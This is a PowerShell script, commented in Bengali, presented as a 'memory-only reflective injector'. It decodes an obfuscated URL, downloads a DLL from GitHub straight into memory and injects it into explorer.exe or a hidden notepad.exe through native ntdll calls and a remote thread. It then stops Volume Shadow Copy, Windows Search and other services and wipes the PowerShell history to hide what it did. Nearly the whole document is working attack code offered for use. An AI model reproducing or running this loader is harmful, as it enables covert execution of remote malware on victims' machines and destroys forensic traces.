# ================================================================
# INJECTOR.ps1 - MEMORY-ONLY REFLECTIVE INJECTOR v5.0 (FIXED)
# রান করতে: PowerShell এডমিন মোডে, lalu .\injector.ps1
# ================================================================

# ---- বেস৬৪ এনকোডেড ইউআরএল (তোমার DLL-এর লিংক) ----
$urlEnc = "aHR0cHM6Ly9naXRodWIuY29tL2Rlc2VydDAwNy9yZS9yYXcvcmVmcy9oZWFkcy9tYWluL1N5c1ZlbnNvbl9Db3JlWC5wc2Qx"
# উপরেরটা শুধু উদাহরণ — তুমি তোমার আসল DLL লিংক বসাও:
# $urlEnc = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("https://github.com/desert007/bios/raw/refs/heads/main/version.dll"))
$url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($urlEnc))

# ---- NT API ডিক্লেয়ার (ডাইরেক্ট সিসকলের জন্য) ----
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class NtSyscalls {
    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern int NtAllocateVirtualMemory(
        IntPtr ProcessHandle,
        ref IntPtr BaseAddress,
        IntPtr ZeroBits,
        ref IntPtr RegionSize,
        uint AllocationType,
        uint Protect
    );

    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern int NtWriteVirtualMemory(
        IntPtr ProcessHandle,
        IntPtr BaseAddress,
        byte[] Buffer,
        uint NumberOfBytesToWrite,
        out uint NumberOfBytesWritten
    );

    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern int NtProtectVirtualMemory(
        IntPtr ProcessHandle,
        ref IntPtr BaseAddress,
        ref IntPtr RegionSize,
        uint NewProtect,
        out uint OldProtect
    );

    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern int NtCreateThreadEx(
        out IntPtr ThreadHandle,
        uint DesiredAccess,
        IntPtr ObjectAttributes,
        IntPtr ProcessHandle,
        IntPtr StartAddress,
        IntPtr Parameter,
        bool CreateSuspended,
        uint StackZeroBits,
        uint SizeOfStackCommit,
        uint SizeOfStackReserve,
        IntPtr AttributeList
    );

    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern int NtClose(IntPtr Handle);

    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern int NtOpenProcess(
        out IntPtr ProcessHandle,
        uint DesiredAccess,
        IntPtr ObjectAttributes,
        ref ClientId ClientId
    );

    [StructLayout(LayoutKind.Sequential)]
    public struct ClientId {
        public IntPtr UniqueProcess;
        public IntPtr UniqueThread;
    }
}
"@

# ---- টার্গেট প্রসেস (explorer.exe অথবা notepad.exe) ----
$procs = Get-Process -Name "explorer" -ErrorAction SilentlyContinue
if (-not $procs) {
    Write-Host "[!] Explorer not found, spawning notepad.exe as target..."
    $target = Start-Process -FilePath "notepad.exe" -WindowStyle Hidden -PassThru
    Start-Sleep -Milliseconds 500
    $pidTarget = $target.Id
} else {
    $pidTarget = $procs[0].Id
}
Write-Host "[+] Target PID: $pidTarget"

# ---- মেমোরিতে DLL ডাউনলোড (ডিস্কে কিছু না) ----
Write-Host "[+] Downloading DLL from: $url"
$wc = New-Object System.Net.WebClient
$wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
try {
    $dllBytes = $wc.DownloadData($url)
} catch {
    Write-Host "[!] Download failed: $_"
    exit 1
}
$wc.Dispose()

if ($dllBytes.Length -lt 1024) {
    Write-Host "[!] Downloaded file too small (size: $($dllBytes.Length) bytes). Aborting."
    exit 1
}
Write-Host "[+] Downloaded $($dllBytes.Length) bytes."

# ---- টার্গেট প্রসেস ওপেন ----
$clientId = New-Object NtSyscalls+ClientId
$clientId.UniqueProcess = [IntPtr]$pidTarget
$clientId.UniqueThread = [IntPtr]0

$hProcess = [IntPtr]0
$status = [NtSyscalls]::NtOpenProcess([ref]$hProcess, 0x1F0FFF, [IntPtr]0, [ref]$clientId)
if ($status -ne 0 -or $hProcess -eq [IntPtr]Zero) {
    Write-Host "[!] NtOpenProcess failed. Status: $status"
    exit 1
}
Write-Host "[+] Process opened: $hProcess"

# ---- মেমরি এলোকেট (RW) ----
$baseAddr = [IntPtr]0
$regionSize = [IntPtr]$dllBytes.Length
$status = [NtSyscalls]::NtAllocateVirtualMemory(
    $hProcess,
    [ref]$baseAddr,
    [IntPtr]0,
    [ref]$regionSize,
    0x3000,  # MEM_COMMIT | MEM_RESERVE
    0x04     # PAGE_READWRITE
)
if ($status -ne 0) {
    Write-Host "[!] NtAllocateVirtualMemory failed. Status: $status"
    [NtSyscalls]::NtClose($hProcess)
    exit 1
}
Write-Host "[+] Memory allocated at: 0x$($baseAddr.ToString('X'))"

# ---- DLL বাইট রাইট করা ----
$bytesWritten = 0
$status = [NtSyscalls]::NtWriteVirtualMemory(
    $hProcess,
    $baseAddr,
    $dllBytes,
    [System.UInt32]$dllBytes.Length,   # ← এখানে [uint] নয়, সরাসরি [System.UInt32]
    [ref]$bytesWritten
)
if ($status -ne 0 -or $bytesWritten -ne $dllBytes.Length) {
    Write-Host "[!] NtWriteVirtualMemory failed. Status: $status, Written: $bytesWritten"
    [NtSyscalls]::NtClose($hProcess)
    exit 1
}
Write-Host "[+] $bytesWritten bytes written."

# ---- প্রোটেকশন পরিবর্তন (RW → RX) ----
$regionSize = [IntPtr]$dllBytes.Length
$oldProtect = 0
$status = [NtSyscalls]::NtProtectVirtualMemory(
    $hProcess,
    [ref]$baseAddr,
    [ref]$regionSize,
    0x20,  # PAGE_EXECUTE_READ
    [ref]$oldProtect
)
if ($status -ne 0) {
    Write-Host "[!] NtProtectVirtualMemory failed (non-critical). Status: $status"
}

# ---- EntryPoint RVA বের করা (PE হেডার থেকে) ----
$e_lfanew = [System.BitConverter]::ToInt32($dllBytes, 0x3C)
$entryRVA = [System.BitConverter]::ToInt32($dllBytes, $e_lfanew + 0x28)
$startAddr = [IntPtr]::Add($baseAddr, $entryRVA)
Write-Host "[+] EntryPoint RVA: 0x$($entryRVA.ToString('X')), Start address: 0x$($startAddr.ToString('X'))"

# ---- থ্রেড তৈরি (NtCreateThreadEx) ----
$hThread = [IntPtr]0
$status = [NtSyscalls]::NtCreateThreadEx(
    [ref]$hThread,
    0x1FFFFF,           # THREAD_ALL_ACCESS
    [IntPtr]0,
    $hProcess,
    $startAddr,
    [IntPtr]0,          # Parameter = NULL
    $false,             # CreateSuspended = false (রান করতে)
    0,
    0,
    0,
    [IntPtr]0
)
if ($status -ne 0) {
    Write-Host "[!] NtCreateThreadEx failed. Status: $status"
    [NtSyscalls]::NtClose($hProcess)
    exit 1
}
Write-Host "[+] Thread created successfully. Handle: $hThread"

# ---- ক্লিনআপ ----
[NtSyscalls]::NtClose($hThread)
[NtSyscalls]::NtClose($hProcess)

# ---- রেজিস্ট্রি টুইক + হিস্ট্রি ক্লিয়ার (অপশনাল) ----
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WSearch" -Name "Start" -Value 4 -Force -ErrorAction SilentlyContinue
Stop-Service -Name "WSearch" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "cbdhsvc*" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "VSS*" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "fhsvc*" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "UltraViewService*" -Force -ErrorAction SilentlyContinue

Clear-History
$historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt')
if (Test-Path $historyPath) { Remove-Item $historyPath -Force -ErrorAction SilentlyContinue }
New-Item -Path $historyPath -ItemType File -Force -ErrorAction SilentlyContinue | Out-Null

Write-Host "[+] Injection complete. DLL is running in target process."
